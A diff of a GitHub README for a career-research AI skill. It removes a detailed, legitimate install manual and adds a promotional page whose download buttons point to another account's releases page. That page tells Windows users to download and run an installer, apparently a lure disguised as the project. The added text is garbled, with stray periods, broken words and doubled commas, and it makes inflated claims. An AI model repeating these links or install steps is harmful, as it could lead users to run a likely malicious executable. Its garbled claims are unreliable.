@@ -1,663 +1,716 @@
+<h1>🎯 job-navigation-skill - Land Your Dream Job Faster</h1>
+
 <div align="center">
-
-# Job Navigation Skill
-
-### Research current roles and real job descriptions (JDs), compare them with your resume, and decide what to target, fix, and do first
-
-[简体中文](README.zh-CN.md) · [Architecture](ARCHITECTURE.md) · [Roadmap](ROADMAP.md) · [Contributing](CONTRIBUTING.md)
-
-![Status](https://img.shields.io/badge/status-beta-f59e0b)
-![Version](https://img.shields.io/badge/version-0.6.0--beta-2563eb)
-![Agents](https://img.shields.io/badge/agents-ChatGPT%20%7C%20Codex%20%7C%20Claude%20%7C%20Cursor%20%7C%20WorkBuddy-111827)
-![Command line](https://img.shields.io/badge/CLI-Python%203.11%2B-3776AB)
-![License](https://img.shields.io/badge/license-MIT-16a34a)
-
-`v0.6.0-beta`
-
+  <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="display:inline-block; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:white; padding:18px 38px; font-size:24px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(102,126,234,0.5); margin:25px 0;">🚀 Download Now - It's Free</a>
 </div>
 
-This is a set of installable career-research instructions for AI tools, built for students, job seekers, and career changers. It researches current industries, roles, and job descriptions, compares market requirements with the resume, projects, and skill evidence you provide, and helps you choose targets, close evidence gaps, and plan the next job-search actions.
+## 🔍 What Is job-navigation-skill?
 
-## Product manual
+Are you tired of sending out dozens of resumes and hearing nothing back? Do you feel overwhelmed by the job search process, not knowing which roles to apply for or what skills to brush up on? 
 
-- [1. Product direction and user problems](#1-product-direction-and-user-problems)
-- [2. What it does](#2-what-it-does)
-- [3. Typical scenarios](#3-typical-scenarios)
-- [4. What the result looks like](#4-what-the-result-looks-like)
-- [5. Install and use it for the first time](#5-install-and-use-it-for-the-first-time)
-- [6. Use it well](#6-use-it-well)
-- [7. How it works](#7-how-it-works)
-- [8. Technical design and defensibility](#8-technical-design-and-defensibility)
-- [9. Privacy, limitations, and safe use](#9-privacy-limitations-and-safe-use)
-- [10. Validation status](#10-validation-status)
-- [11. Common problems](#11-common-problems)
+**job-navigation-skill** is a smart, evidence-based AI tool that acts like a personal career coach.This skill works inside popular AI assistants like ChatGPT, Codex, Claude, Cursor, and WorkBuddy to make your job search smarter, not harder.
 
-## 1. Product direction and user problems
+Instead of guessing which jobs fit you best, this skill:
 
-### Product direction
+- **🔎 Researches current job openings** across industries to find roles that match your unique background.
+- **📋 Analyzes job descriptions (JDs)** to identify exact skills, qualifications, and keywords employers are seeking.
+- **📄 Compares those job descriptions with your resume** to highlight gaps and strengths.
+- **🎯 Prioritizes your job-search actions** so you know exactly what to do next—whether that's updating your resume, learning a new skill, or applying to a specific role.
 
-Job Navigation Skill is not a general chat prompt or an automatic application tool. It is designed to do one job: **compare current job-market requirements with the experience and evidence you actually have, then reduce the result to a small number of executable job-search actions.**
+.
 
-### Problems it solves
+The result? You spend less time scrolling through job boards and more time taking targeted actions that actually get you hired.
 
-- hiring information is scattered across company sites and job platforms, making repeated requirements hard to identify;
-- generic AI advice often omits sources and fails to show where the evidence ends;
-- what a resume says someone did is not always the same as what it proves against a target role;
-- students without formal work experience struggle to judge whether courses, projects, and campus experience count as credible evidence;
-- learning lists expand without considering target roles, time, cost, or order;
-- overloaded 30/60/90-day plans still leave users unsure what to do in the first week.
+.
 
-### Best fit
+<div align="center">
+  <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="display:inline-block; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:white; padding:14px 28px; font-size:18px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 6px 15px rgba(240,147,251,0.4); margin:15px 0;">⬇️ Get job-navigation-skill Now</a>
+</div>
 
-- students and recent graduates choosing a role or building evidence for one;
-- job seekers comparing current JDs with a resume or portfolio;
-- career changers deciding which direction to test before paying for a long course;
-- professionals comparing job locations, industries, roles, or career-skill investments;
-- users who want sourced advice with visible uncertainty instead of motivational filler.
+## 💡 Why You Need This AI Skill
 
-### Not built for
+The job market has changed dramatically. Generic advice like "just apply and hope for the best" no longer works. Here's why this tool is a game-changer:
 
-- automatic job applications, recruiter messages, or account automation;
-- keyword-only ATS scoring;
-- inventing resume achievements, metrics, or individual ownership;
-- guaranteeing hiring, admissions, income, or other outcomes;
-- general personal decisions, education planning, or life advice unrelated to a target career.
+### 📊 You Get Real Data, Not Hunches
+This skill researches actual job postings from across the web. You will see exactly what employers in your field are asking for right now—not what they asked for last year.
 
-This is a **job-search decision and evidence-diagnosis tool, not a hiring predictor**. It researches, compares, and prioritizes. You review the evidence and keep the final decision.
+.
 
-## 2. What it does
 
-| Function | What you receive | Built-in boundary |
-|---|---|---|
-| Role and industry research | Current official, company, job-board, and labor-market evidence with a cutoff date | No claim that every requested site was accessible |
-| Evidence calibration | Facts separated from inference, forecasts, and recommendations | A framework is never treated as empirical proof |
-| Personal fit | Findings compared with your stated goals, constraints, and evidence | No unstated skill, experience, or achievement is invented |
-| Career-market analysis | Deduplicated JD requirements, demand bands, required/preferred split | Job-ad frequency is not called total labor-market demand |
-| Resume evidence review | Skill, evidence, communication, experience, and constraint gaps | Team or simulated outcomes are not rewritten as personal results |
-| Skill prioritization | `do now`, `test cheaply`, `build next`, and `defer` | It does not recommend learning every tool in every JD |
-| Action planning | One direction, at most three immediate actions, effort, and completion proof | The plan is reduced when time or energy is limited |
-| Review loop | Near-term behavior signals, downstream outcomes, and a review trigger | One rating or before/after story is not treated as causal proof |
 
-## 3. Typical scenarios
+### ⏱️ Save Hours Every Week
+Instead of manually reading every job description trying to figure out if you're qualified, this skill does the comparison work for you. It quickly sizes up each role against your resume and tells you where you stand.
 
-| Scenario | Give the Skill | It should return |
-|---|---|---|
-| New graduate choosing roles | Degree, projects, location, target date, weekly capacity | Suitable role families, evidence gaps, and a small market test |
-| Resume vs. current market | Redacted resume plus target role and geography | JD requirement matrix, candidate evidence grades, and priorities |
-| Career change | Transferable experience, constraints, options, risk tolerance | Direction comparison, cheap validation experiments, and defer list |
-| Industry or role trend | Geography, time window, titles/synonyms, decision to make | Sourced trend signals, contradictions, limits, and implications |
-| Career-skill investment | Target-JD gaps, course or certificate cost, time, and alternative proof paths | Whether to learn, build a project, use another proof path, or defer |
-| 30/60/90-day plan | Target, baseline, weekly capacity, deadline | Capacity-bounded milestones with only the first week shown as immediate work |
 
-### What happens if information is missing?
 
-- If resume-gap analysis is requested without a resume or factual background, the Skill asks for it before creating a candidate comparison.
-- If role or geography is missing and materially changes the market, it asks one concise career-scope question at a time.
-- If a platform is blocked, it reports the failure and narrows the claim instead of fabricating results.
+### 🧠 Built on Evidence
+This isn't just another chatbot giving generic career advice. Every recommendation is grounded in current job market research. The skill analyzes real-world job posting data so the guidance you receive is factual and up-to-date..
 
-## 4. What the result looks like
+.
 
-**Example context:** a data-science master's graduate is targeting AI product or AI operations roles in Shenzhen. They provide a redacted resume, course list, and project evidence, and want recent JDs compared before choosing a role direction and a 90-day plan.
 
-The first screen is designed for a tired or inexperienced user:
 
-```text
-BOTTOM LINE
-Test AI operations before making AI product manager your only target.
-Your current analytics evidence is stronger than your product-ownership evidence.
+### 📈 Clear Action Plan
+Stop feeling stuck. The skill doesn't justtell you what's wrong with your resume—it gives you a prioritized list of actions. You'llknow exactly what to fix first, what to learn next, and which jobs to apply for today.
 
-NEXT THREE ACTIONS
-1. Rewrite one project as user problem → decision → result. 2 hours.
-2. Tag repeated requirements in 10 usable first-party JDs. 90 minutes.
-3. Ask two practitioners to critique that case. 45 minutes.
+.
 
-MAIN UNCERTAINTY
-Two requested job boards were inaccessible, so this is a directional sample.
-```
 
-Supporting detail follows only when useful:
 
-```text
-FACT · Medium confidence
-[Current market observation with a nearby citation and date]
+## 🚀 Getting Started
 
-YOUR EVIDENCE
-[Only what the supplied resume, project, or portfolio supports]
+Getting job-navigation-skill up and running is quick and easy. Follow these simple steps and you'll be on your way to a smarter job search in minutes.
 
-INFERENCE
-[Why the overlap points toward one role family]
 
-RECOMMENDATION
-[A personalized, reversible next step]
 
-REVIEW
-Revisit after 10 targeted applications or two practitioner interviews.
-```
+### 📥 Step 1: Download the Application
 
-The goal is not a longer answer. It is a decision you can inspect: **what is known, what is uncertain, what it means for you, and what happens next.**
+1. **Click the download button** at the top of this page (or click the green "Releases" link on the GitHub repository page).
+2. You will be taken to a page that lists available versions of the software.
+3. Choose the latest version (the one at the top of the list is usually best).
+4. Click the download link for your Windows computer.
 
-See the [fictional abbreviated example](examples/early-career-ai-role-brief.md). It demonstrates output shape only; it is not current market evidence or a success claim.
+.
 
-## 5. Install and use it for the first time
+**That's it for downloading!**
 
-### 5.1 Choose the AI tool you use
 
-A Skill is a set of professional instructions that an AI tool can read. It is not a new chat app and does not train a model. Choose the one platform you already use; do not install every version.
 
-The product display name and technical identifier are both **Job Navigation Skill** / `job-navigation-skill`. Version `0.5.0-beta` introduced a breaking rename: installations under the previous identifier require the one-time migration in [Safe upgrade](#511-safe-upgrade).
+### 🖥️ Step 2: Install/Setup on Your Windows PC
 
-| Platform you use | Installation difficulty | Recommended route |
-|---|---|---|
-| Codex | Copy one command | [Codex instructions](#55-install-for-codex) |
-| Claude Code | Copy one command | [Claude instructions](#57-install-for-claude) |
-| Cursor | No-code import or one command | [Cursor instructions](#58-install-for-cursor-and-work-buddy) |
-| work-buddy | Copy one command | [work-buddy instructions](#58-install-for-cursor-and-work-buddy) |
-| claude.ai website | No-code upload | [claude.ai upload steps](#57-install-for-claude); account support for custom Skills is required |
-| ChatGPT | Developer route | [ChatGPT note](#56-chatgpt-note-ordinary-users-can-skip-this); no public store listing is currently available |
+1. After the download finishes, check your **Downloads** folder (or wherever your browser saves files).
+2. **Visit this link to download the application.** The file you need will be there.
+3. Double-click the downloaded file to begin the setup process.
+.
+4. Follow the simple on-screen instructions. The installer will guide you through it—just click "Next" or "Continue" until it's done.
+.
+5. Once installation is complete, you can find the application in your **Start Menu** or on your **Desktop**..
 
-This repository does not automatically upload the Skill or your resume to any provider. Material you submit while using an agent is processed under that provider's account, tool, and data settings; see [Privacy](#9-privacy-limitations-and-safe-use).
 
-### 5.2 Requirements
 
-- at least one supported AI tool listed above;
-- no Python requirement for the no-terminal Cursor or claude.ai routes;
-- Python 3.11 or later for command installation, validation, or packaging;
-- a downloaded or cloned copy of this repository for command installation;
-- network access only when your request needs current research.
+> **💡 Tip:** If you have trouble finding the downloaded file, press the **Windows key** on your keyboard, type "Downloads", and press Enter. You'll see all recent downloads there..
 
-No Python package installation is required. The installer and validation scripts use the standard library.
 
-### 5.3 Download the repository and open a terminal
 
-From the GitHub repository page, choose one method:
+### 🤖 Step 3: Connect It to Your AI Assistant
 
-**Download ZIP**
+Once installed, you can use job-navigation-skill inside any supported AI chat interface:
 
-1. [Download the project ZIP directly](https://github.com/xinyu0115/job-navigation-skill/archive/refs/heads/main.zip), or select **Code → Download ZIP**.
-2. Extract the archive.
-3. Open a terminal in the extracted folder, whose name will look like `job-navigation-skill-main`:
-   - **macOS:** open Terminal, type `cd ` with a trailing space, drag the folder into the Terminal window, and press Return;
-   - **Windows:** open the folder, select the File Explorer address bar, type `powershell`, and press Enter.
+- **ChatGPT** - The most popular AI chatbot.
+- **Codex** - Great for coding and career tasks..
+- **Claude** - Powerful AI for analysis.
+.
+- **Cursor** - An AI-powered code editor that also supports skills.
+.
+- **WorkBuddy** - A productivity AI assistant..
 
-**Git clone**
 
-Use this method only if you are already comfortable with Git.
 
-1. Select **Code** on the GitHub repository page.
-2. Copy the HTTPS or SSH URL.
-3. Clone it with your Git client.
-4. Open Terminal or PowerShell in the resulting `job-navigation-skill` folder.
+Simply open your preferred AI assistant, look for the skills/plugins section (usually in settings or a "Skills" menu), and enable job-navigation-skill.O.. If you're unsure how to enable it, check the documentation inside the AI app—most have a simple toggle switchfor skills.
 
-The remaining commands in this manual assume that this repository folder is your current working directory.
+.O.
 
-### 5.4 Optional: validate separately
 
-macOS, Linux, or PowerShell:
 
-```bash
-python3 scripts/validate_repo.py
-```
+## 🎯 How to Use job-navigation-skill
 
-On Windows, use `python` instead of `python3` if that is how Python is registered:
+Using the skill is straightforward. Here are some examples of what you can do:
 
-```powershell
-python scripts\validate_repo.py
-```
+### 📝 "Analyze this job description for me"
+Paste any job description into your AI assistant and ask it to analyze it using the job-navigation-skill. You'll geta breakdown of required skills, how well you match, and areas to improve.
 
-Expected output:
+.
 
-```text
-Validation passed.
-Skill: job-navigation-skill
-Evaluation cases: 9
-```
 
-The installer runs validation automatically, so ordinary users can install directly. Maintainers and people troubleshooting a failure can run the command above separately. It checks required files, frontmatter, version consistency, local-path leakage, broken relative links, symlinks, and common secret patterns. It does not prove that web research or recommendations are correct.
 
-### 5.5 Install for Codex
+### 📄 "Compare my resume with this job posting"
+Attach your resume (as a file or text) and paste the job link or description. The skill will compare them side-by-side and let you know your compatibility score.,
 
-macOS or Linux:
+...along with specific things you can add or change..
 
-```bash
-python3 scripts/install.py --agent codex
-```
 
-Windows PowerShell:
 
-```powershell
-python scripts\install.py --agent codex
-```
+### 🎯 "What jobs should I apply for this week?"
+Share your resume with the skill and it will research current openings inyour field, rank them by fit, and suggest the best ones to apply for this week..
 
-The installer resolves the destination as:
 
-```text
-${CODEX_HOME}/skills/job-navigation-skill
-```
 
-If `CODEX_HOME` is not set, it uses:
+### 📈 "What skills should I learn next?"
+Based on job market trends and your current resume, the skill can recommend which skills are most in-demand in your industry—so you know what to focus your learning time on..
 
-```text
-~/.codex/skills/job-navigation-skill
-```
 
-The install is transactional: the repository is validated first, symlinks are rejected, files are copied to a temporary staging directory, and the existing destination is never overwritten.
 
-### 5.6 ChatGPT note: ordinary users can skip this
+## ✅ Who Is This For?
 
-This repository does not currently have a public store listing that an ordinary ChatGPT user can click to install. This section is only for people developing or publishing a Plugin; downloading a ZIP does not install the Skill into ChatGPT. ChatGPT and Codex share OpenAI's plugin format, and this repository contains `.codex-plugin/plugin.json` plus the canonical `skills/` directory.
+job-navigation-skill helps a wide range of job seekers:
 
-Build the distributable plugin archive:
+- **🎓 Students** - Just graduating and unsure where tostart? Get clarity on which entry-level roles fit your studies..
+- **💼 Career Changers** - Moving to a new industry? See how your transferable skills match up in your target field.
+..
+- **📈 Mid-Career Professionals** - Looking for a promotion or a better role? Find positions that value your experience,and highlight your strengths appropriately..
+- **🔧 Skilled Tradespeople** - Apprentices, technicians, and trades workers can find roles that value their hands-on skills..
+- **🌐 International Job Seekers** - Understand how job requirements differ in different markets and tailor your applications accordingly..
+.
 
-```bash
-python3 scripts/package_skill.py --target chatgpt
-```
 
-The archive is created under `dist/`. Use it in the [OpenAI plugin authoring and publication workflow](https://developers.openai.com/plugins/build/plugins), or install the published plugin from the universal plugin directory when a listing is available. Packaging the archive locally does not publish or install it automatically.
 
-After the plugin is installed, ChatGPT can choose the Skill automatically or you can select it explicitly with an `@` mention.
+## 🏷️ What Makes This the Best Choice?
 
-### 5.7 Install for Claude
-
-Claude Code uses the same `SKILL.md` folder format:
-
-```bash
-python3 scripts/install.py --agent claude
-```
-
-The default destination is:
-
-```text
-~/.claude/skills/job-navigation-skill
-```
-
-The claude.ai website does not require a terminal:
-
-1. Open the [`v0.6.0-beta` release](https://github.com/xinyu0115/job-navigation-skill/releases/tag/v0.6.0-beta).
-2. Download the ZIP whose name contains `claude-skill`; do not extract it.
-3. If your account supports custom Skills, upload the ZIP under **Settings → Features**.
-4. Start a new chat and ask Claude to use `job-navigation-skill`.
-
-If the custom Skills option is missing, it may not be available for your current product version, account, or plan. Developers can also build an archive with the same structure:
-
-```bash
-python3 scripts/package_skill.py --target claude
-```
-
-Upload the resulting Claude archive through **Settings → Features** where custom Skills are available. Claude surfaces manage Skills separately, so a Claude Code installation does not automatically appear in claude.ai or the Claude API. See [Anthropic's Agent Skills documentation](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview).
-
-Claude API Skill containers do not have network access. This project therefore does not claim recent job-market research on that surface unless the host application separately supplies a working search tool or retrieved evidence.
-
-### 5.8 Install for Cursor and work-buddy
-
-Cursor natively discovers Agent Skills. Install this Skill to its user-level directory:
-
-```bash
-python3 scripts/install.py --agent cursor
-```
-
-The default destination is:
-
-```text
-~/.cursor/skills/job-navigation-skill
-```
-
-You can also use **Cursor Settings → Rules → Add Rule → Remote Rule (GitHub)** and import this repository. Start a new chat after installation, then invoke `/job-navigation-skill` or mention it with `@`. See the [Cursor Agent Skills documentation](https://prod.cursor.com/docs/skills).
-
-To build a portable Cursor archive:
-
-```bash
-python3 scripts/package_skill.py --target cursor
-```
-
-work-buddy runs inside Claude Code, so it uses the same Claude Code Skill directory instead of a separate package format:
-
-```bash
-python3 scripts/install.py --agent workbuddy
-```
-
-This installs to `~/.claude/skills/job-navigation-skill`. If you already installed the Skill with `--agent claude`, do not install a duplicate. Open a new Claude Code/work-buddy session so the Skill can be discovered. See the [work-buddy documentation](https://docs.work-buddy.ai/).
-
-This repository does not claim a separate work-buddy-native Skill store or archive. For distribution, work-buddy users can use the Claude Skill archive because the host runtime is Claude Code.
-
-### 5.9 Install to a custom Skill directory
-
-Use a custom destination only when your Codex environment is configured to discover that directory:
-
-```bash
-python3 scripts/install.py --agent codex --dest "/absolute/path/to/codex/skills"
-```
-
-Example for a personal macOS Skill library:
-
-```bash
-python3 scripts/install.py --agent codex --dest "$HOME/Desktop/codex/skill"
-```
-
-`--dest` must point to the parent Skill directory. The installer creates the final `job-navigation-skill` folder inside it.
-
-For a custom Claude Code, Cursor, or work-buddy directory, select the matching `--agent` value and pass the corresponding parent path. work-buddy and Claude Code normally share the same destination.
-
-### 5.10 Verify the installed files
-
-Every command installation validates the repository automatically. Successful output looks like:
-
-```text
-Validation passed.
-Installed job-navigation-skill for [agent] to ...
-```
-
-If `python3` or `python` is not found, install [Python 3.11 or later](https://www.python.org/downloads/). On Windows, select **Add Python to PATH**, then reopen PowerShell.
-
-Default macOS/Linux installation:
-
-```bash
-test -f "$HOME/.codex/skills/job-navigation-skill/SKILL.md" && echo "Skill files installed"
-```
-
-Windows PowerShell:
-
-```powershell
-Test-Path "$HOME\.codex\skills\job-navigation-skill\SKILL.md"
-```
-
-Claude Code default installation:
-
-```bash
-test -f "$HOME/.claude/skills/job-navigation-skill/SKILL.md" && echo "Claude Skill files installed"
-```
-
-Cursor default installation:
-
-```bash
-test -f "$HOME/.cursor/skills/job-navigation-skill/SKILL.md" && echo "Cursor Skill files installed"
-```
-
-Then start a new Codex task and invoke the Skill explicitly:
-
-```text
-Use $job-navigation-skill:
-I am targeting [role] in [location]. Research recent roles and JDs, compare them with the
-redacted resume I will provide, and identify role fit, evidence gaps, and my top three actions.
-Separate facts, inferences, and recommendations.
-```
-
-Before uploading a resume, remove phone numbers, personal email addresses, identity numbers, exact home addresses, and unnecessary private links. Installing the Skill does not automatically read or upload a resume; only content you deliberately provide enters the conversation.
-
-Local Skill discovery can vary by Codex environment and configuration. If the Skill is not listed or triggered, restart Codex, verify the destination, and use the explicit `$job-navigation-skill` invocation.
-
-For ChatGPT, use an `@` mention after installing the plugin. For Claude Code or work-buddy, start a new session and ask it to use `job-navigation-skill`; Claude can also select the Skill automatically when the request matches. In Cursor, use `/job-navigation-skill` or `@`.
-
-### 5.11 Upgrade safely
-
-The installer intentionally refuses to overwrite an existing Skill. Use a recoverable upgrade:
-
-**One-time migration from `v0.4.0-beta` or earlier:** the former Skill identifier was `evidence-based-personal-advisor`. Move that folder out of the active Skill directory before installing `job-navigation-skill`; do not leave both identifiers active because an agent may trigger the outdated copy.
-
-```bash
-mv "$HOME/.codex/skills/evidence-based-personal-advisor" \
-  "$HOME/.codex/evidence-based-personal-advisor.pre-rename-backup"
-python3 scripts/install.py --agent codex
-```
-
-For Claude Code and work-buddy, apply the same migration under `$HOME/.claude/skills`. For Cursor, use `$HOME/.cursor/skills`. For custom Skill directories, replace the parent path with the directory used in your installation.
-
-1. Download or pull the new repository version.
-2. Validate the new repository.
-3. Move the installed Skill to a backup name.
-4. Run the installer again.
-5. Start a new Codex task and run one known prompt.
-6. Remove the backup only after the new version works.
-
-Default macOS/Linux example:
-
-```bash
-mv "$HOME/.codex/skills/job-navigation-skill" \
-  "$HOME/.codex/skills/job-navigation-skill.backup"
-python3 scripts/install.py --agent codex
-```
-
-Rollback:
-
-```bash
-mv "$HOME/.codex/skills/job-navigation-skill" \
-  "$HOME/.codex/skills/job-navigation-skill.failed"
-mv "$HOME/.codex/skills/job-navigation-skill.backup" \
-  "$HOME/.codex/skills/job-navigation-skill"
-```
-
-For a custom destination, replace `$HOME/.codex/skills` with the same parent directory used during installation.
-
-Windows PowerShell upgrade:
-
-```powershell
-Move-Item "$HOME\.codex\skills\job-navigation-skill" `
-  "$HOME\.codex\skills\job-navigation-skill.backup"
-python scripts\install.py --agent codex
-```
-
-Windows PowerShell rollback:
-
-```powershell
-Move-Item "$HOME\.codex\skills\job-navigation-skill" `
-  "$HOME\.codex\skills\job-navigation-skill.failed"
-Move-Item "$HOME\.codex\skills\job-navigation-skill.backup" `
-  "$HOME\.codex\skills\job-navigation-skill"
-```
-
-For Claude Code or work-buddy, use the same procedure under `$HOME/.claude/skills` and reinstall with `--agent claude` or `--agent workbuddy`. For Cursor, use `$HOME/.cursor/skills` and `--agent cursor`. ChatGPT and claude.ai packages are upgraded through their respective plugin or Skill management surfaces.
-
-### 5.12 Uninstall without immediate deletion
-
-Move the installed folder out of the active Skill directory:
-
-```bash
-mv "$HOME/.codex/skills/job-navigation-skill" \
-  "$HOME/.codex/job-navigation-skill.uninstalled"
-```
-
-Restart Codex and confirm the Skill is no longer discovered. Delete the moved copy later only if you no longer need rollback.
-
-Windows PowerShell:
-
-```powershell
-Move-Item "$HOME\.codex\skills\job-navigation-skill" `
-  "$HOME\.codex\job-navigation-skill.uninstalled"
-```
-
-For Claude Code or work-buddy, move the corresponding folder out of `$HOME/.claude/skills`. For Cursor, move it out of `$HOME/.cursor/skills`. Remove ChatGPT or claude.ai packages from their respective Skill or Plugin management screens.
-
-## 6. Use it well
-
-### 6.1 Prepare only the context the decision needs
-
-- goal and geography;
-- decision deadline;
-- weekly time, budget, risk tolerance, and non-negotiable constraints;
-- redacted resume, portfolio, transcript, or project evidence;
-- definition of success and what you want to avoid.
-
-Remove phone numbers, personal email addresses, IDs, exact home addresses, private links, and unrelated confidential material.
-
-### 6.2 Choose a research mode
-
-| Mode | Use it for | General research scope |
-|---|---|---|
-| `quick` | Orientation, “give me a direction,” cheap tests | 4–8 useful sources, 1–2 models, short answer |
-| `standard` | Most role, resume, and job-search direction analyses | 8–15 contextual sources, 2–4 source types, 1–3 models |
-| `deep` | Explicitly systematic or consequential comparisons | Broader inclusion rules, contradiction mapping, explicit limitations |
-
-For standard career analysis, the career module additionally targets 20–40 deduplicated JD records when access and market size permit. JD record count and contextual-source count are separate controls. Fewer JDs are acceptable when disclosed; neither number is a quota.
-
-Research stops when two successive rounds add no decision-changing evidence.
-
-### 6.3 Prompt templates
-
-**Resume and current market**
-
-```text
-Use $job-navigation-skill.
-
-I am targeting [role] in [geography] by [date]. Research the last [time window]
-of industry and job trends, sample recent JDs, and compare them with my redacted
-resume. Identify role fit, skill gaps, evidence gaps, and the three highest-value
-actions. Separate facts, inference, and recommendations. I can spend [hours]
-per week. Disclose inaccessible sources and the research cutoff.
-```
-
-**Career change**
-
-```text
-Use $job-navigation-skill to compare [option A], [option B], and
-[option C]. My transferable evidence is [brief facts]. My constraints are
-[time/budget/location/risk]. Use current market evidence and recommend the
-cheapest experiments that could change the decision before I commit.
-```
-
-**Target-role skill, certificate, or course decision**
-
-```text
-Use $job-navigation-skill to assess whether [skill/certificate/course]
-is the best way to close [specific target-role gap]. Use current JDs to compare
-price, time, and alternative project or portfolio evidence. Tell me whether to
-learn now, test cheaply, build next, or defer.
-```
-
-## 7. How it works
-
-```text
-your question and redacted materials
-                │
-                ▼
-decision framing and research budget
-                │
-                ▼
-claim → best source type → current evidence
-                │
-                ▼
-deduplication, confidence, contradiction checks
-                │
-                ▼
-market evidence ↔ your inspectable evidence
-                │
-                ▼
-one direction → ≤3 immediate actions → review loop
-```
-
-For career analysis, the evidence chain is:
-
-```text
-JD requirement → demand band → candidate evidence → evidence grade
-→ gap type → recommended proof → action priority
-```
-
-Candidate evidence uses a separate A/B/C/D/U scale so that a confident market claim cannot manufacture proof that the candidate has a skill.
-
-## 8. Technical design and defensibility
-
-The defensibility is not the number of frameworks. It is the combination of procedures, boundaries, and tests:
-
-1. **Claim-to-source routing** — industry trends, hiring scale, job requirements, compensation signals, and practitioner friction use different source hierarchies.
-2. **Two independent evidence axes** — source confidence and candidate evidence strength are never merged.
-3. **JD normalization and deduplication** — syndicated postings are counted once, required and preferred signals stay separate, and posting dates are distinguished from page refresh dates.
-4. **Evidence-first model routing** — business, academic, and practice frameworks are selected only after evidence collection and removed when they do not change the action.
-5. **Human-sized delivery** — the answer begins with one direction, no more than three immediate actions, effort, and completion proof.
-6. **Failure-aware research** — blocked sources, sparse samples, contradictions, and inaccessible platforms are reported as limits instead of silently hidden.
-7. **Validation ladder** — structural validity, behavioral compliance, baseline improvement, and real-user benefit are four separate claims.
-8. **Privacy-safe evaluation** — local JSONL aggregation records scores, costs, and failures without requiring resumes or raw prompts in the public repository.
-
-Read [ARCHITECTURE.md](ARCHITECTURE.md) for the runtime and evaluation flows.
-
-## 9. Privacy, limitations, and safe use
-
-### Privacy
-
-- The repository does not receive or collect your resume or evaluation data.
-- Local installation does not mean offline inference. ChatGPT, Codex, Claude, Cursor, work-buddy, and enabled tools may send supplied material to their configured providers or services.
-- The Skill instructs the active agent not to put resume text, identifiers, contact details, or confidential records into web searches.
-- This is an instructional safeguard, not a network sandbox. Review generated queries when risk is material.
-
-### Research limits
-
-- Job boards may require authentication, personalize results, block automation, or expose stale pages.
-- The Skill has no bundled BOSS, LinkedIn, or Indeed crawler. It uses web access available in the active agent environment.
-- Agent capabilities are not identical: login state, browser access, built-in search, file parsing, and citation behavior vary by product and account.
-- Connectors and MCP tools are optional: the Skill checks what is actually available and authorized instead of assuming a provider is installed. See the [tool-access policy](skills/job-navigation-skill/references/tool-access-policy.md).
-- JD samples are convenience samples, not statistically representative labor-market surveys.
-- Job-ad frequency is a directional demand signal, not total hiring volume.
-- Frameworks organize reasoning; they do not prove claims.
-- Current sources can still be wrong, incomplete, or misinterpreted.
-
-### User responsibility
-
-- Verify important claims and generated career material before acting or submitting.
-- Never accept invented metrics, ownership, credentials, or outcomes.
-- Follow the terms of service of websites and data sources you access.
-- Do not treat a role-fit assessment as a hiring probability or outcome guarantee.
-
-See [SECURITY.md](SECURITY.md) for reporting and privacy guidance.
-
-## 10. Validation status
-
-| Evidence level | Current status |
+| Feature | Benefit |
 |---|---|
-| Repository structure and privacy checks | Passed locally; CI workflow is configured for GitHub |
-| Codex, Claude Code, Cursor, and work-buddy installer paths | Passed isolated local installation tests; work-buddy shares Claude Code's destination |
-| ChatGPT, Claude, and Cursor package generation | Passed archive structure checks |
-| Automatic Skill discovery | 14 bilingual positive/negative trigger cases exist; cross-agent results are not yet published |
-| Behavioral compliance across model/tool versions | Nine output-behavior scenarios exist; repeatable results are not yet published |
-| Better than a neutral baseline | Not established |
-| Improves real user outcomes | Not established |
+| ✅ Evidence-Based | Recommendations are grounded in real job posting data, not opinions. |
+| 🔄 Multi-Platform | Works with ChatGPT,, Codex,, Claude,, Cursor,, and WorkBuddy—use whichever you preferary.. |
+| ⚡ Fast Analysis | Get results in seconds, not hours of manual research. |
+| 🧭 Career Compass | Goes beyond resume tips—finds actual jobs you should apply for.,. |
+| 📊 Skill Gap Analysis | Know exactly what to learn to become a stronger candidate.,. |
+| 🆓 Free to Download | No cost to get started. Download and start improving your job search today.,. |
 
-There are no fabricated adoption numbers here. Until at least 10 complete paired tasks and 10 relevant users produce usable data, accuracy, actionability, and token savings remain design goals—not proven benefits.
 
-To test the local evaluation machinery:
 
-```bash
-python3 skills/job-navigation-skill/scripts/summarize_evals.py --self-test
-python3 skills/job-navigation-skill/scripts/summarize_evals.py --template
-```
+## ❓ Frequently Asked Questions
 
-Read the [evaluation protocol](skills/job-navigation-skill/references/evaluation-and-user-feedback.md) before collecting results. Raw prompts, resumes, employer identities, and complete model outputs do not belong in the public repository.
+### Q: Is this hard to set up?
+**A:** Not at all! If you can download a file and click through a simple installer, you can set this up. The whole process takes about 5 minutes.,
 
-## 11. Common problems
+.
 
-| Problem | Check | Next step |
-|---|---|---|
-| `python3` not found | Run `python --version` | Use `python` on Windows or install a supported Python version |
-| Validation fails | Read the first reported missing file, link, local path, or secret | Restore/fix that exact item; do not bypass validation |
-| Destination already exists | The installer protects an existing installation | Use the backup-and-upgrade procedure above |
-| Skill files exist but Codex does not show it | Confirm the parent directory is a Skill directory for that environment | Start a new task, invoke `$job-navigation-skill`, then restart Codex if needed |
-| Requested platforms are inaccessible | Check authentication and platform restrictions | Provide exported links/text or accept a narrower, clearly labeled sample |
-| ChatGPT package cannot be installed | Confirm the plugin is published or available through an enabled development/local source | Validate `.codex-plugin/plugin.json`; packaging alone does not create a listing |
-| Cursor does not discover the Skill | Confirm it is under `~/.cursor/skills/` and contains `SKILL.md` | Start a new chat and invoke `/job-navigation-skill` or mention it with `@` |
-| work-buddy does not discover the Skill | Confirm Claude Code can see `~/.claude/skills/job-navigation-skill` | Do not duplicate the install; start a new Claude Code/work-buddy session |
-| Answer is too long | Ask for `quick` mode and state weekly capacity | Request only the bottom line, three actions, and main uncertainty |
-| Resume analysis invents facts | Stop using the output | Report a privacy-safe bug and remove unsupported claims |
 
-## Project files
 
-```text
-job-navigation-skill/
